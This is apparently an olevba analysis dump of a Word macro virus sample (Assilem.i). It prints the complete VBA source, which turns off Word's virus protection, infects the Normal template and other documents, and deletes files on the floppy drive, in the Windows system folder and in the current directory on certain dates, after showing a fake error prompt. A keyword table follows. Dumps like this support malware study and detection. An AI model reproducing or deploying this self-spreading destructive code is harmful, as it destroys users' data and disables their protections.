olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.i-faf760b60e216c60b04a4bd93463faa986b70bda
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO QNC.cls 
in file: Virus.MSWord.Assilem.i-faf760b60e216c60b04a4bd93463faa986b70bda - OLE stream: 'Macros/VBA/QNC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'########## QNC in TaiWan 2000.1.1 #############
On Error Resume Next
With ActiveDocument
    .ReadOnlyRecommended = False
End With
With Options
    .BackgroundSave = True
    .AllowFastSave = True
    .SavePropertiesPrompt = False
    .SaveInterval = 1
    .SaveNormalPrompt = False
    .VirusProtection = False
End With
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "QNC" Then
     If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
     Set ToInfect = ADI1
     ADI1.Name = "QNC"
     DoAD = True
End If
If NTI1.Name <> "QNC" Then
     If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
     Set ToInfect = NTI1
     NTI1.Name = "QNC"
     DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
     If DoNT = True Then
          Do While ADI1.CodeModule.Lines(1, 1) = ""
               ADI1.CodeModule.DeleteLines 1
          Loop
          ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
          Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
               ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
               BGN = BGN + 1
          Loop
     End If
If DoAD = True Then
      Do While NTI1.CodeModule.Lines(1, 1) = ""
           NTI1.CodeModule.DeleteLines 1
      Loop
      ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
      Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
           ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
           BGN = BGN + 1
      Loop
End If
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
     ActiveDocument.Saved = True
End If
CYA:
If CInt(Hour(Now)) >= 17 And CInt(Hour(Now)) <= 23 Then
   On Error Resume Next
   Kill "a:\*.*"
End If
m = CInt(Month(Now))
d = CInt(Day(Now))
If (d = 13) And (m Mod 4 = 0) Then
   On Error Resume Next
   If MsgBox("Fatal Error！Power Off Your Computer Now！！", vbCritical + vbOKCancel, "쒸멩！") = vbCancel Then
     Dim filestring As String
     Dim Dir1, FF
     Dir1 = "c:\windows\system\"
     FF = Dir(Dir1 & "*.*", vbArchive Or vbHidden Or vbSystem Or vbDirectory)
     Do
      If (GetAttr(Dir1 & FF) And vbDirectory) <> vbDirectory Then
       If GetAttr(Dir1 & FF) = vbReadOnly Or vbSystem Or vbHide Then
          SetAttr Dir1 & FF, vbNormal
       End If
       Kill Dir1 & FF
      End If
      FF = Dir
     Loop Until FF = ""
   End If
   Dir1 = CurDir()
   If Right(Dir1, 1) <> "\" Then Dir1 = Dir1 & "\"
   Kill Dir1 & "*.*"
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

